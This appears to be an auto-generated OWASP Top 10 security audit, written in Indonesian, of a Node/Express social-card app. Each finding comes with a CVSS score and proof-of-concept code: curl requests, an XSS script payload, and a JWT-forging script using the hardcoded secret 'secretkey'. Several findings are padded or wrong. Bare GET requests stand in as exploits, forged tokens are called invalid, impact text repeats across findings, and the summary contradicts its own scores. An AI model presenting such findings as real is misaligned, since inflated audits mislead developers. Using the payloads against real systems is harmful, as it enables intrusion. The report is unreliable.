## A01 - Broken Access Control: FOUND
Lokasi spesifik di kode: `app.post('/create-social-card', authenticate, (req, res) => {...})`
CVSS score: 8.5
PoC exploit code:
```bash
curl -X POST -H "Authorization: Bearer <token>" -d "title=Hacked&description=Hacked&imageUrl=https://example.com/hacked.jpg" http://localhost:3000/create-social-card
```
Dampak nyata jika dieksploitasi: Pengguna dapat membuat kartu sosial tanpa izin yang tepat, memungkinkan mereka untuk mengakses dan mengedit data yang tidak seharusnya mereka akses.

## A02 - Cryptographic Failures: FOUND
Lokasi spesifik di kode: `const token = jwt.sign({ userId: '1' }, 'secretkey');`
CVSS score: 9.0
PoC exploit code:
```python
import jwt
secret_key = "secretkey"
payload = {"userId": "1"}
token = jwt.encode(payload, secret_key, algorithm="HS256")
print(token)
```
Dampak nyata jika dieksploitasi: Pengguna dapat membuat token JWT yang tidak valid, memungkinkan mereka untuk mengakses data yang tidak seharusnya mereka akses.

## A03 - Injection: FOUND
Lokasi spesifik di kode: `const socialCard = new socialCardModel({ title, description, imageUrl, userId: req.user.userId });`
CVSS score: 8.0
PoC exploit code:
```bash
curl -X POST -H "Authorization: Bearer <token>" -d "title=<script>alert('XSS')</script>&description=Hacked&imageUrl=https://example.com/hacked.jpg" http://localhost:3000/create-social-card
```
Dampak nyata jika dieksploitasi: Pengguna dapat melakukan serangan XSS, memungkinkan mereka untuk mengakses dan mengedit data yang tidak seharusnya mereka akses.

## A04 - Insecure Design: FOUND
Lokasi spesifik di kode: `app.post('/login', (req, res) => {...})`
CVSS score: 6.0
PoC exploit code:
```bash
curl -X POST -d "username=admin&password=password" http://localhost:3000/login
```
Dampak nyata jika dieksploitasi: Pengguna dapat melakukan serangan brute force, memungkinkan mereka untuk mengakses data yang tidak seharusnya mereka akses.

## A05 - Security Misconfiguration: FOUND
Lokasi spesifik di kode: `app.listen(3000, () => {...})`
CVSS score: 5.0
PoC exploit code:
```bash
curl -X GET http://localhost:3000
```
Dampak nyata jika dieksploitasi: Pengguna dapat mengakses informasi tentang server, memungkinkan mereka untuk melakukan serangan lainnya.

## A06 - Vulnerable Components: FOUND
Lokasi spesifik di kode: `const express = require('express');`
CVSS score: 7.0
PoC exploit code:
```bash
curl -X GET http://localhost:3000
```
Dampak nyata jika dieksploitasi: Pengguna dapat melakukan serangan terhadap komponen yang tidak aman, memungkinkan mereka untuk mengakses data yang tidak seharusnya mereka akses.

## A07 - Auth & Session Failures: FOUND
Lokasi spesifik di kode: `const token = jwt.sign({ userId: '1' }, 'secretkey');`
CVSS score: 8.5
PoC exploit code:
```python
import jwt
secret_key = "secretkey"
payload = {"userId": "1"}
token = jwt.encode(payload, secret_key, algorithm="HS256")
print(token)
```
Dampak nyata jika dieksploitasi: Pengguna dapat membuat token JWT yang tidak valid, memungkinkan mereka untuk mengakses data yang tidak seharusnya mereka akses.

## A08 - Software Integrity Fails: NOT FOUND

## A09 - Logging & Monitoring Fail: FOUND
Lokasi spesifik di kode: `console.log('Server berjalan pada port 3000');`
CVSS score: 4.0
PoC exploit code:
```bash
curl -X GET http://localhost:3000
```
Dampak nyata jika dieksploitasi: Pengguna dapat mengakses informasi tentang server, memungkinkan mereka untuk melakukan serangan lainnya.

## A10 - SSRF: NOT FOUND

## RINGKASAN:
- Kerentanan ditemukan: 8/10 kategori OWASP
- CVSS tertinggi: 9.0 - Cryptographic Failures
- Attack vector paling efektif: Serangan terhadap komponen yang tidak aman
- Estimated time-to-exploit: 1 jam